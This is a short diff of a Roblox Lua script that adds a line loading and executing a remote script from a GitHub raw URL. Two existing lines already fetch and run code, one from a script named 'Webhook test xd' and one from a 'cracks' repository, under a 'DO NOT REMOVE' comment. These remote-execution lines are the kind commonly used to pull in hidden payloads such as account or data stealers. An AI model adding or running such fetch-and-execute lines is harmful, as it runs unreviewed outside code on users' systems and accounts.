@@ -2,6 +2,7 @@
 -- DO NOT REMOVE
 
 -- // Variables \\ --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/z", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rvllah/scripts/refs/heads/main/Webhook%20test%20xd", true))()
 spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/cracklua/cracks/m/cute"))()end)
 local Ocean = {}
